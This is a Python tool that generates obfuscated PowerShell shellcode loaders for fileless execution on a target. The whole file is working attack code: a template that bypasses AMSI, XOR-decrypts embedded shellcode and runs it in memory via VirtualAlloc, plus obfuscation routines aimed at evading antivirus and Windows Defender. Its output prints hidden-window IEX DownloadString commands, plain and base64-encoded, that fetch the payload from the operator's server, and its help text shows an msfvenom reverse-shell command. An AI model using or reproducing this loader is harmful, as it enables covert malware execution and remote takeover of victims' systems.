#!/usr/bin/env python3
import sys
import os
import random
import string
import socket
import base64
import re

# ------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------
# Port you will use for the Python Web Server
WEB_PORT = 80 

def get_local_ip():
    """Attempts to auto-detect the local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Does not actually connect, just determines route
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = "127.0.0.1"
    finally:
        s.close()
    return IP

def random_string(length=6):
    """Generates a random filename to avoid patterns."""
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def generate_encryption_key(length=16):
    """Generates a random encryption key."""
    return os.urandom(length)

def xor_encrypt(data, key):
    """Encrypts data using XOR cipher."""
    encrypted = bytearray()
    key_len = len(key)
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key[i % key_len])
    return bytes(encrypted)

def encrypt_shellcode(shellcode_bytes):
    """Encrypts shellcode and returns encrypted bytes, key, and IV."""
    # Generate a random key (16 bytes for AES-like key, but we'll use XOR)
    key = generate_encryption_key(16)
    encrypted = xor_encrypt(shellcode_bytes, key)
    return encrypted, key

def split_shellcode_into_chunks(shellcode_bytes, num_chunks=None):
    """
    Splits shellcode into multiple chunks with random variable names.
    Returns a list of (variable_name, chunk_bytes) tuples and the concatenation code.
    """
    if num_chunks is None:
        # Determine number of chunks based on shellcode size
        shellcode_len = len(shellcode_bytes)
        if shellcode_len < 50:
            num_chunks = 2
        elif shellcode_len < 200:
            num_chunks = 3
        elif shellcode_len < 500:
            num_chunks = 4
        else:
            num_chunks = 5
    
    # Calculate chunk size
    chunk_size = len(shellcode_bytes) // num_chunks
    chunks = []
    
    for i in range(num_chunks):
        var_name = random_variable_name(random.randint(15, 25))
        
        # Get chunk (last chunk gets any remaining bytes)
        if i == num_chunks - 1:
            chunk = shellcode_bytes[i * chunk_size:]
        else:
            chunk = shellcode_bytes[i * chunk_size:(i + 1) * chunk_size]
        
        chunks.append((var_name, chunk))
    
    return chunks

def random_variable_name(length=None):
    """Generates a random PowerShell variable name."""
    if length is None:
        length = random.randint(8, 20)
    # Mix of uppercase and lowercase letters
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

def create_junk_comment():
    """Creates random corporate/business-themed comments for obfuscation."""
    words = [
        "Initializing system configuration parameters", "Establishing secure connection protocols",
        "Validating user authentication credentials", "Processing transaction request",
        "Executing scheduled maintenance routine", "Updating database records",
        "Synchronizing network resources", "Performing system health check",
        "Loading application dependencies", "Configuring service endpoints",
        "Establishing communication channels", "Validating input parameters",
        "Processing batch operations", "Updating configuration settings",
        "Initializing component libraries", "Establishing secure session",
        "Validating security tokens", "Processing authentication request",
        "Loading system modules", "Configuring network parameters",
        "Establishing database connection", "Validating system integrity",
        "Processing user requests", "Updating system registry",
        "Initializing service components", "Establishing API endpoints",
        "Validating certificate chain", "Processing configuration updates",
        "Loading runtime libraries", "Configuring security policies",
        "Establishing encrypted tunnel", "Validating access permissions",
        "Processing system events", "Updating user preferences",
        "Initializing network stack", "Establishing connection pool",
        "Validating session tokens", "Processing data synchronization",
        "Loading configuration files", "Configuring application settings",
        "Establishing secure channel", "Validating system requirements",
        "Processing background tasks", "Updating system cache",
        "Initializing service handlers", "Establishing communication protocol",
        "Validating system state", "Processing queued operations",
        "Loading system resources", "Configuring network interfaces",
        "Establishing service connection", "Validating system configuration",
        "Processing system logs", "Updating system metrics",
        "Initializing application context", "Establishing data pipeline",
        "Validating system compliance", "Processing system notifications"
    ]
    return "# " + random.choice(words) + "."

def insert_backticks(text, probability=0.75):
    """Inserts backticks into a string to obfuscate it."""
    # Characters that shouldn't be backticked (PowerShell escape sequences)
    avoid_chars = set('a0befnrtuxv')
    result = []
    for char in text:
        if char.lower() in avoid_chars:
            result.append(char)
        elif random.random() < probability:
            result.append('`' + char)
        else:
            result.append(char)
    return ''.join(result)

def transformer(text, target_strings, chunk_size=3, obfuscation_level=3):
    """
    Breaks strings into chunks and reconstructs them as variables.
    Inspired by Chimera's transformer function.
    """
    variables = []
    replacements = {}
    
    for target in target_strings:
        # Find all occurrences (case-insensitive)
        pattern = re.compile(re.escape(target), re.IGNORECASE)
        matches = list(pattern.finditer(text))
        
        if not matches:
            continue
        
        # Create chunks
        chunks = []
        chunk_vars = []
        
        # Break string into chunks
        for i in range(0, len(target), chunk_size):
            chunk = target[i:i+chunk_size]
            if chunk:
                var_name = random_variable_name()
                chunk_vars.append(f"${var_name}")
                variables.append(f"${var_name} = \"{chunk}\"")
                chunks.append((chunk, var_name))
        
        # Create replacement string with proper PowerShell concatenation using + operators
        # This creates: ($var1 + $var2 + $var3) instead of $var1$var2$var3
        if len(chunk_vars) > 1:
            replacement = '(' + ' + '.join(chunk_vars) + ')'
        else:
            replacement = chunk_vars[0] if chunk_vars else ''
        
        replacements[target] = replacement
    
    # Build the variable declarations at the top
    var_declarations = '\n'.join(variables) + '\n' if variables else ''
    
    # Replace all occurrences
    result = text
    for original, replacement in replacements.items():
        result = re.sub(re.escape(original), replacement, result, flags=re.IGNORECASE)
    
    return var_declarations + result

def obfuscate_variables(text, obfuscation_level=3):
    """Replaces variable names with random strings."""
    # Find all PowerShell variables ($varName)
    var_pattern = r'\$([a-zA-Z_][a-zA-Z0-9_]*)'
    variables_found = set(re.findall(var_pattern, text))
    
    # Skip built-in variables
    built_ins = {'_', 'true', 'false', 'null', 'args', 'error', 'input', 'PSBoundParameters'}
    variables_found = variables_found - built_ins
    
    replacements = {}
    for var in variables_found:
        if var not in replacements:
            new_name = random_variable_name()
            replacements[var] = new_name
    
    # Replace variables
    result = text
    for old_var, new_var in replacements.items():
        # Replace $oldVar with $newVar (word boundary to avoid partial matches)
        pattern = r'\$' + re.escape(old_var) + r'\b'
        result = re.sub(pattern, f'${new_var}', result)
    
    return result

def obfuscate_datatypes(text, obfuscation_level=3):
    """Obfuscates data types by breaking them into chunks."""
    # Common data types to obfuscate
    datatypes = [
        'System.Management.Automation',
        'System.Runtime.InteropServices',
        'System.Runtime.InteropServices.Marshal',
        'Ref',
        'Byte',
        'IntPtr',
        'ShellcodeDelegate',
        'Win32',
        'Kernel32',
        'VirtualAlloc',
        'GetDelegateForFunctionPointer',
        'Copy',
        'GetType',
        'GetField',
        'SetValue',
        'Assembly'
    ]
    
    return transformer(text, datatypes, chunk_size=obfuscation_level, obfuscation_level=obfuscation_level)

def obfuscate_strings(text, obfuscation_level=3):
    """Obfuscates common strings by breaking them into chunks."""
    strings_to_obfuscate = [
        'Amsi',
        'Utils',
        'amsiInitFailed',
        'NonPublic',
        'Static',
        'kernel32.dll',
        'using System',
        'public class',
        'public static extern',
        'public delegate',
        'Add-Type',
        'TypeDefinition',
        'PassThru',
        'Length',
        'Zero',
        'Decrypt-Payload',
        'Decrypt',
        'Payload',
        'encrypted',
        'keyBytes',
        'decrypted'
    ]
    
    return transformer(text, strings_to_obfuscate, chunk_size=obfuscation_level, obfuscation_level=obfuscation_level)

def insert_comments(text, probability=0.3):
    """Inserts random comments into the code, avoiding here-strings."""
    lines = text.split('\n')
    result = []
    in_here_string = False
    
    for line in lines:
        stripped = line.strip()
        
        # Track here-string boundaries
        if '@"' in line or "@'" in line:
            in_here_string = True
        elif stripped in ('"@', "'@"):
            in_here_string = False
            result.append(line)
            continue
        
        result.append(line)
        
        # Skip empty lines, comment lines, and lines inside here-strings
        if stripped and not stripped.startswith('#') and not in_here_string:
            if random.random() < probability:
                result.append(create_junk_comment())
    
    return '\n'.join(result)

def randomize_indentation(text, max_spaces=4):
    """Adds random indentation to lines, preserving here-string syntax."""
    lines = text.split('\n')
    result = []
    
    for line in lines:
        stripped = line.strip()
        if stripped:  # Don't indent empty lines
            # Don't indent here-string terminators ("@ or '@) - they MUST be at column 0
            if stripped in ('"@', "'@"):
                result.append(stripped)
            else:
                spaces = random.randint(0, max_spaces)
                result.append(' ' * spaces + line.lstrip())
        else:
            result.append(line)
    
    return '\n'.join(result)

def randomize_case(text, probability=0.3):
    """Randomly changes case of characters in strings."""
    def randomize_char(match):
        char = match.group(0)
        if random.random() < probability:
            return char.swapcase()
        return char
    
    # Only randomize case in string literals and variable names, not keywords
    # This is a simplified version
    result = []
    for char in text:
        if char.isalpha() and random.random() < probability:
            result.append(char.swapcase())
        else:
            result.append(char)
    
    return ''.join(result)

def apply_backticks(text, strings_to_backtick=None):
    """Applies backticks to PowerShell cmdlets and function names only."""
    if strings_to_backtick is None:
        # Only apply backticks to PowerShell cmdlets and function names
        # DO NOT apply to .NET method names (GetType, GetField, SetValue)
        # because backticks break .NET method calls like .GetType()
        strings_to_backtick = [
            'New-Object', 'Add-Type', 'Decrypt-Payload'
        ]
    
    result = text
    for target in strings_to_backtick:
        # Only match PowerShell cmdlets (with hyphen) or function names
        # Pattern matches complete cmdlet/function names with word boundaries
        pattern = re.compile(r'\b' + re.escape(target) + r'\b', re.IGNORECASE)
        
        matches = list(pattern.finditer(result))
        for match in reversed(matches):  # Reverse to maintain positions
            start, end = match.span()
            # Skip if preceded by $ (it's a variable name) or . (it's a method)
            if start > 0 and result[start-1] in ('$', '.'):
                continue
            original = result[start:end]
            backticked = insert_backticks(original)
            result = result[:start] + backticked + result[end:]
    
    return result

def obfuscate_amsi_bypass(text):
    """Applies Chimera-style obfuscation specifically to AMSI bypass."""
    # Find and obfuscate AMSI bypass section
    lines = text.split('\n')
    result = []
    
    # Create variables for System.Management.Automation string obfuscation
    sma_var1 = random_variable_name(15)
    sma_var2 = random_variable_name(15)
    sma_var3 = random_variable_name(15)
    sma_var4 = random_variable_name(15)
    sma_combined = random_variable_name(15)
    
    # Create variables for amsiInitFailed string obfuscation
    amsi_var1 = random_variable_name(15)
    amsi_var2 = random_variable_name(15)
    amsi_var3 = random_variable_name(15)
    amsi_combined = random_variable_name(15)
    
    # Insert variable definitions at the top
    result.append(f"${sma_var1} = \"Sys\"+\"tem.Mana\"")
    result.append(f"${sma_var2} = \"gement.Au\"")
    result.append(f"${sma_var3} = \"tomati\"")
    result.append(f"${sma_var4} = \"on\"")
    result.append(f"${sma_combined} = ${sma_var1}+${sma_var2}+${sma_var3}+${sma_var4}")
    result.append("")
    result.append(f"${amsi_var1} = \"amsi\"")
    result.append(f"${amsi_var2} = \"Init\"")
    result.append(f"${amsi_var3} = \"Failed\"")
    result.append(f"${amsi_combined} = ${amsi_var1}+${amsi_var2}+${amsi_var3}")
    result.append("")
    
    for line in lines:
        # Look for AMSI-related strings and obfuscate them more aggressively
        if '"Amsi"' in line or "'Amsi'" in line:
            # Break "Amsi" into chunks
            var1 = random_variable_name(15)
            var2 = random_variable_name(15)
            result.insert(11, f"${var1} = \"Am\"")
            result.insert(12, f"${var2} = \"si\"")
            line = line.replace('"Amsi"', f"(${var1} + ${var2})")
            line = line.replace("'Amsi'", f"(${var1} + ${var2})")
        
        if '"Utils"' in line or "'Utils'" in line:
            var1 = random_variable_name(15)
            var2 = random_variable_name(15)
            result.insert(13, f"${var1} = \"Ut\"")
            result.insert(14, f"${var2} = \"ils\"")
            line = line.replace('"Utils"', f"(${var1} + ${var2})")
            line = line.replace("'Utils'", f"(${var1} + ${var2})")
        
        # Obfuscate System.Management.Automation
        if 'System.Management.Automation' in line:
            line = line.replace('"System.Management.Automation', f'"${sma_combined}')
            line = line.replace('System.Management.Automation', f"${sma_combined}")
        
        # Obfuscate amsiInitFailed
        if 'amsiInitFailed' in line:
            line = line.replace("'amsiInitFailed'", f"${amsi_combined}")
            line = line.replace('"amsiInitFailed"', f"${amsi_combined}")
        
        result.append(line)
    
    return '\n'.join(result)

def obfuscate_variable_assignments(text, level=3):
    """Obfuscates simple variable names in the original template."""
    # Map of simple variables to complex random names
    simple_vars = ['$g', '$c', '$a', '$b', '$ref', '$size', '$ptr', '$f', '$Win32', '$Kernel32']
    replacements = {}
    
    for var in simple_vars:
        if var in text:
            new_var = '$' + random_variable_name(random.randint(15, 25))
            replacements[var] = new_var
    
    # Replace variables (be careful with word boundaries)
    for old_var, new_var in replacements.items():
        # Use regex to replace only complete variable names
        import re
        pattern = re.escape(old_var) + r'\b'
        text = re.sub(pattern, new_var, text)
    
    return text

def obfuscate_powershell(text, level=3, enable_all=True):
    """
    Main obfuscation function that applies all obfuscation techniques.
    Level: 1=low, 2=medium, 3=high, 4=higher, 5=insane
    """
    print("[*] Applying PowerShell obfuscation...")
    
    # Set chunk sizes based on level
    chunk_sizes = {1: 8, 2: 5, 3: 3, 4: 2, 5: 1}
    chunk_size = chunk_sizes.get(level, 3)
    
    # Apply Chimera-style obfuscation
    if enable_all or level >= 2:
        print("  [*] Obfuscating AMSI bypass (Chimera-style)...")
        text = obfuscate_amsi_bypass(text)
    
    if enable_all or level >= 3:
        print("  [*] Obfuscating variable names (Chimera-style)...")
        text = obfuscate_variable_assignments(text, level)
    
    if enable_all or level >= 2:
        print("  [*] Inserting comments...")
        text = insert_comments(text, probability=0.2 + (level * 0.1))
    
    if enable_all or level >= 2:
        print("  [*] Applying backticks...")
        text = apply_backticks(text)
    
    if enable_all or level >= 2:
        print("  [*] Randomizing indentation...")
        text = randomize_indentation(text, max_spaces=min(level + 1, 5))
    
    print("[+] Obfuscation complete!")
    return text

def print_help():
    """Displays help information for the script."""
    help_text = """
{0}
PowerShell Shellcode Loader Generator with Obfuscation
{0}

DESCRIPTION:
    This script generates a PowerShell payload that injects shellcode into memory
    using Adaptix C2 injection techniques. The generated payload includes:
    - AMSI bypass to evade detection
    - Encrypted shellcode payload (XOR encryption)
    - In-memory decryption before execution
    - In-memory shellcode injection using GetDelegateForFunctionPointer
    - Advanced obfuscation (inspired by Chimera) to bypass AV detection
    - Base64-encoded download commands for obfuscation

USAGE:
    python3 {1} <path_to_shellcode.bin> [options]
    python3 {1} -h, --help

ARGUMENTS:
    <path_to_shellcode.bin>    Path to the binary shellcode file to embed

OPTIONS:
    -h, --help                  Show this help message and exit
    -l, --level LEVEL           Obfuscation level (1=low, 2=medium, 3=high, 4=higher, 5=insane)
                                Default: 3
    -o, --obfuscate             Enable obfuscation (default: enabled)
    --no-obfuscate              Disable obfuscation
    -d, --debug                 Enable debug output in PowerShell (shows decryption info)

EXAMPLES:
    # Generate payload with default obfuscation (level 3)
    python3 {1} shellcode.bin

    # Generate payload with high obfuscation
    python3 {1} shellcode.bin -l 4

    # Generate payload without obfuscation
    python3 {1} shellcode.bin --no-obfuscate

    # Generate payload from msfvenom output
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.bin
    python3 {1} shell.bin -l 5

OUTPUT:
    The script generates a randomly named .ps1 file (e.g., a8j2d.ps1) containing:
    - AMSI bypass code (obfuscated)
    - Encrypted shellcode payload (XOR encrypted)
    - Decryption function to decrypt payload in memory
    - Memory allocation and injection code (obfuscated)
    - Variable name randomization
    - String chunking and reconstruction
    - Random comments and indentation
    - Backtick insertion

    The script also provides:
    1. Direct download command (IEX DownloadString)
    2. Base64-encoded download command (for obfuscation)

OBFUSCATION TECHNIQUES (inspired by Chimera):
    - String substitution: Breaks strings into chunks and reconstructs as variables
    - Variable randomization: Replaces variable names with random strings
    - Data type obfuscation: Obfuscates .NET types and method names
    - Comment insertion: Adds random comments throughout the code
    - Backtick insertion: Inserts PowerShell backticks to break signatures
    - Random indentation: Adds random spacing to avoid pattern detection
    - Case randomization: Randomly changes character case

WORKFLOW:
    1. Run this script with your shellcode file
    2. Start a web server on port {2} (default: 80)
       Example: sudo python3 -m http.server {2}
    3. Execute the provided PowerShell command on the target system
    4. The shellcode will be downloaded and executed in memory

TECHNICAL DETAILS:
    - Encrypts shellcode using XOR cipher with random key
    - Decrypts payload in memory before execution
    - Uses VirtualAlloc to allocate executable memory
    - Copies decrypted shellcode to allocated memory
    - Uses GetDelegateForFunctionPointer for execution (Adaptix C2 method)
    - Includes AMSI bypass to evade Windows Defender detection
    - Generates random filenames to avoid pattern detection
    - Applies multiple layers of obfuscation to evade signature-based detection

NOTES:
    - Ensure your web server is running before executing the payload
    - The script auto-detects your local IP address
    - Default web server port is {2} (configurable in script)
    - The generated PowerShell script is fileless (executes in memory)
    - Higher obfuscation levels may increase file size significantly

{0}
""".format("="*60, os.path.basename(sys.argv[0]), WEB_PORT)
    print(help_text)

# ------------------------------------------------------------------
# POWERSHELL TEMPLATE (AMSI Bypass + Injection)
# ------------------------------------------------------------------
PS_TEMPLATE = """
$g = "Amsi"
$c = "Utils"
$ref = $g + $c
try {{
    $a = [Ref].Assembly.GetType("System.Management.Automation.$ref")
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,$true)
}} catch {{}}

{encrypted_shellcode_chunks}

[Byte[]] $key = {encryption_key_bytes}

# XOR decryption function
function Decrypt-Payload {{
    param([Byte[]]$data, [Byte[]]$keyBytes)
    $decrypted = New-Object Byte[] $data.Length
    $keyLen = $keyBytes.Length
    for ($i = 0; $i -lt $data.Length; $i++) {{
        $decrypted[$i] = $data[$i] -bxor $keyBytes[$i % $keyLen]
    }}
    return $decrypted
}}

# Decrypt the shellcode
[Byte[]] $buf = Decrypt-Payload -data $encrypted -keyBytes $key

{debug_output}

if ($buf.Length -eq 0) {{
    exit
}}

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class {csharp_class_name} {{
    private const string {dll_part1} = "ker";
    private const string {dll_part2} = "nel";
    private const string {dll_part3} = "32.";
    private const string {dll_part4} = "dll";
    [DllImport({dll_part1} + {dll_part2} + {dll_part3} + {dll_part4}, EntryPoint = "{entrypoint_obfuscated}")]
    public static extern IntPtr {method_name}(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}}
public delegate IntPtr {csharp_delegate_name}();
"@

$Win32 = Add-Type -TypeDefinition $Kernel32 -PassThru

$size = $buf.Length
$ptr = [{csharp_class_name}]::{method_name}([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($ptr -eq [IntPtr]::Zero) {{
    exit
}}
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $size)
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [{csharp_delegate_name}])
try {{
    $f.Invoke()
}} catch {{}}
"""

def main():
    # Parse command line arguments
    obfuscation_level = 3
    enable_obfuscation = True
    enable_debug = False
    input_file = None
    
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ['-h', '--help', 'help']:
            print_help()
            return
        elif arg in ['-l', '--level']:
            if i + 1 < len(sys.argv):
                try:
                    obfuscation_level = int(sys.argv[i + 1])
                    if obfuscation_level < 1 or obfuscation_level > 5:
                        print("[!] Error: Obfuscation level must be between 1 and 5")
                        return
                    i += 2
                    continue
                except ValueError:
                    print("[!] Error: Invalid obfuscation level")
                    return
            else:
                print("[!] Error: -l/--level requires a value")
                return
        elif arg in ['-o', '--obfuscate']:
            enable_obfuscation = True
            i += 1
            continue
        elif arg == '--no-obfuscate':
            enable_obfuscation = False
            i += 1
            continue
        elif arg in ['-d', '--debug']:
            enable_debug = True
            i += 1
            continue
        elif not arg.startswith('-'):
            input_file = arg
            i += 1
            continue
        else:
            print(f"[!] Error: Unknown option: {arg}")
            print_help()
            return
        i += 1
    
    # Check for help flag or no arguments
    if input_file is None:
        print_help()
        return
    
    # Generate random output filename (e.g., a8j2d.ps1)
    random_name = random_string() + ".ps1"
    
    if not os.path.exists(input_file):
        print(f"[!] Error: File '{input_file}' not found.")
        return

    print(f"[*] Reading shellcode from: {input_file}")
    
    try:
        with open(input_file, "rb") as f:
            raw_bytes = f.read()
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        return

    # Encrypt the shellcode
    print("[*] Encrypting shellcode payload...")
    encrypted_bytes, encryption_key = encrypt_shellcode(raw_bytes)
    print(f"[+] Shellcode encrypted (original: {len(raw_bytes)} bytes, encrypted: {len(encrypted_bytes)} bytes)")

    # Split encrypted shellcode into chunks
    print("[*] Splitting shellcode into multiple variables...")
    chunks = split_shellcode_into_chunks(encrypted_bytes)
    print(f"[+] Shellcode split into {len(chunks)} chunks")
    
    # Generate PowerShell code for chunks
    chunk_definitions = []
    chunk_var_names = []
    
    for var_name, chunk_bytes in chunks:
        chunk_hex = ",".join([f"0x{byte:02X}" for byte in chunk_bytes])
        chunk_definitions.append(f"[Byte[]] ${var_name} = {chunk_hex}")
        chunk_var_names.append(f"${var_name}")
    
    # Add concatenation code
    concatenation = f"[Byte[]] $encrypted = {' + '.join(chunk_var_names)}"
    
    # Combine all chunk code
    encrypted_shellcode_chunks = "\n".join(chunk_definitions) + "\n\n" + concatenation
    
    # Convert key to PowerShell hex format
    key_hex_array = ",".join([f"0x{byte:02X}" for byte in encryption_key])

    # Prepare debug output if enabled
    if enable_debug:
        debug_output = f"""
Write-Host "[DEBUG] Encrypted length: $($encrypted.Length)"
Write-Host "[DEBUG] Key length: $($key.Length)"
Write-Host "[DEBUG] Decrypted length: $($buf.Length)"
Write-Host "[DEBUG] First 16 bytes of decrypted shellcode:"
if ($buf.Length -ge 16) {{
    Write-Host "  $([System.BitConverter]::ToString($buf[0..15]))"
}} else {{
    Write-Host "  $([System.BitConverter]::ToString($buf))"
}}
"""
        print("[*] Debug mode enabled - payload will output diagnostic information")
    else:
        debug_output = ""

    # Generate random C# class and delegate names for obfuscation
    csharp_class_name = random_variable_name(random.randint(10, 20))
    csharp_delegate_name = random_variable_name(random.randint(10, 20))
    
    # Generate random names for DLL string parts (to obfuscate kernel32.dll)
    dll_part1 = random_variable_name(random.randint(8, 15))
    dll_part2 = random_variable_name(random.randint(8, 15))
    dll_part3 = random_variable_name(random.randint(8, 15))
    dll_part4 = random_variable_name(random.randint(8, 15))
    
    # Generate random method name (to obfuscate VirtualAlloc)
    method_name = random_variable_name(random.randint(10, 20))
    
    # The actual EntryPoint must be "VirtualAlloc" (can't change this)
    # but we can obfuscate it with string concatenation
    entrypoint_obfuscated = "Virt" + "ualAl" + "loc"
    
    # Inject into template
    final_script = PS_TEMPLATE.format(
        encrypted_shellcode_chunks=encrypted_shellcode_chunks, 
        encryption_key_bytes=key_hex_array,
        debug_output=debug_output,
        csharp_class_name=csharp_class_name,
        csharp_delegate_name=csharp_delegate_name,
        dll_part1=dll_part1,
        dll_part2=dll_part2,
        dll_part3=dll_part3,
        dll_part4=dll_part4,
        method_name=method_name,
        entrypoint_obfuscated=entrypoint_obfuscated
    )
    
    # Apply obfuscation if enabled
    if enable_obfuscation:
        print(f"\n[*] Obfuscation level: {obfuscation_level}")
        final_script = obfuscate_powershell(final_script, level=obfuscation_level)
    else:
        print("[*] Obfuscation disabled")

    # Write final loader
    try:
        with open(random_name, "w") as f:
            f.write(final_script)
    except Exception as e:
        print(f"[!] Error writing output file: {e}")
        return

    # Get IP for the one-liner
    my_ip = get_local_ip()

    print("\n" + "="*60)
    print(f" SUCCESS! Payload Generated: {random_name}")
    print("="*60)
    
    print("\n[STEP 1] Start your Web Server here:")
    print(f"   sudo python3 -m http.server {WEB_PORT}")

    print("\n[STEP 2] RUN THIS ON TARGET (Direct Download):")
    print("-" * 80)
    print(f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{my_ip}:{WEB_PORT}/{random_name}')\"")
    print("-" * 80)
    
    # Base64 encode the download command itself
    download_cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{my_ip}:{WEB_PORT}/{random_name}')"
    download_cmd_bytes = download_cmd.encode('utf-16-le')  # PowerShell -enc expects UTF-16LE
    download_cmd_base64 = base64.b64encode(download_cmd_bytes).decode('utf-8')
    
    print("\n[STEP 3] Base64 Encoded Download Command:")
    print("-" * 80)
    print(f"powershell -nop -w hidden -enc {download_cmd_base64}")
    print("-" * 80 + "\n")

if __name__ == "__main__":
    main()